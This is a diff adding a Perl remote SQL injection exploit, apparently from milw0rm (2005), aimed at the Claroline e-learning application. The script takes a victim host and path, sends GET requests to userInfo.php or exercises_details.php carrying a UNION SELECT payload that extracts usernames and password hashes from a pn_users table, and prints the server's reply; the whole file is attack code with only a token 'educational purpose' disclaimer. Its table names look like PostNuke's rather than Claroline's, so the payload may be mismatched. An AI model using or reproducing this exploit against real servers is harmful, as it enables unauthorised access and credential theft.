@@ -1,0 +1,67 @@
+#!/usr/bin/perl
+# Claroline E-Learning Application Remote SQL Exploit
+# [K-C0d3r]
+# This tools and to consider only himself to educational purpose
+# Bug discovered by
+# Greetz to mZ, 2b TUBE, off, rikky, str0ke, x0n3-h4ck, MWC
+# [K-C0d3r]
+
+use IO::Socket;
+
+sub Usage {
+print STDERR "Usage: KCcol-xpl.pl <www.victim.com> <path/dir> <target_num>\n";
+print STDERR "Targets:\n1 - userInfo.php\n";
+print STDERR "2 - exercises_details.php\n";
+exit;
+}
+
+if (@ARGV < 3)
+{
+ Usage();
+}
+
+if (@ARGV > 3)
+{
+ Usage();
+}
+
+if (@ARGV == 3)
+{
+$host = @ARGV[0];
+$path = @ARGV[1];
+$target = @ARGV[2];
+
+print "[K-C0d3r]  Claroline E-Learning Application Remote SQL Exploit [K-C0d3r]\n";
+print "[+] Connecting to $host\n";
+
+$sqli = "%20UNION%20SELECT%20pn_uname,null,pn_uname,pn_pass,pn_pass,null,pn_pass,null";
+$sqli .= "%20FROM%20pn_users%20WHERE%20pn_uid=2/*";
+
+$socket = new IO::Socket::INET (PeerAddr => "$host",
+                                PeerPort => 80,
+                                Proto => 'tcp');
+                                die unless $socket;
+
+print "[+] Injecting command ...\n";
+
+if ($target == 1)
+{
+print $socket "GET http://$host/$path/userInfo.php?uInfo=-1$sqli HTTP/1.1\nHost: $host\n\n Connection: Close\r\n\r\n";
+while (<$socket>)
+{
+ print $_;
+ exit;
+}
+}
+if ($target == 2)
+{
+print $socket "GET http://$host/$path/exercises_details.php?uInfo=-1$sqli HTTP/1.1\nHost: $host\n\n Connection: Close\r\n\r\n";
+while (<$socket>)
+{
+ print $_;
+ exit;
+}
+}
+}
+
+# milw0rm.com [2005-06-19]
